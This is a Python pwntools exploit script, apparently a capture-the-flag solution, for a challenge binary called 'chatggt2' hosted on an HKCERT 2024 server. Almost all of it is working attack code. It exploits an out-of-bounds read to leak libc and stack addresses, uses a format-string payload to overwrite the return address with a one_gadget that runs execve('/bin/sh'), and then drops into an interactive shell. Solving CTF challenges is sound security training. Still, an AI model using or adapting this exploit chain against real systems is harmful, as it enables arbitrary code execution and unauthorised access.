#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc_chal.so.6", checksec = False)

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("c56-chatggt2.hkcert24.pwnable.hk", 1337, ssl = True)

    return r


def main():
    r = conn()

    # NOTE: Sometimes program doesn't find the right values for libc and stack. Just re-run it

    # Skip all the hardcoded answers
    for _ in range(36):
        r.sendafter(b": ", b"A")

    # Now the program will read answers out-of-bound.
    # We will use NULL pointers to avoid segfault.
    # NOTE: We can set 20 NULL ptrs just once but how really cares :)
    for _ in range(20):
        r.sendafter(b": ", p64(0x0) * 20)

    # Leak libc
    r.sendafter(b": ", b"A")
    libc.address = u64(r.recvline().strip().ljust(8, b"\x00")) - (libc.sym._IO_2_1_stdout_)
    log.info(f"libc @ 0x{libc.address:x}")

    # Leak stack addresses
    r.sendafter(b": ", (p64(0x0) * 21) + p64(libc.sym.environ))
    buf_addr = u64(r.recvline().strip().ljust(8, b"\x00")) - 0x248
    ret_addr = buf_addr + 0x118
    log.info(f"buf_addr @ 0x{buf_addr:x}")
    log.info(f"ret_addr @ 0x{ret_addr:x}")

    """
        0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
        constraints:
          address rbp-0x50 is writable
          rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
          [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
    """

    # Overwrite return address with one_gadget
    fmtstr = fmtstr_payload(44, {ret_addr: libc.address + 0xebd43}).ljust(22 * 8, b"A")
    payload = flat(
                    fmtstr,
                    buf_addr
                )

    r.sendafter(b": ", payload)

    # Fix stack to meet one_gadget's constraints
    r.sendafter(b": ", p64(0x0) * 24)

    # Exit and trigger the gadget
    r.sendafter(b": ", b"EXIT\n")
    r.interactive("$ ")


if __name__ == "__main__":
    main()
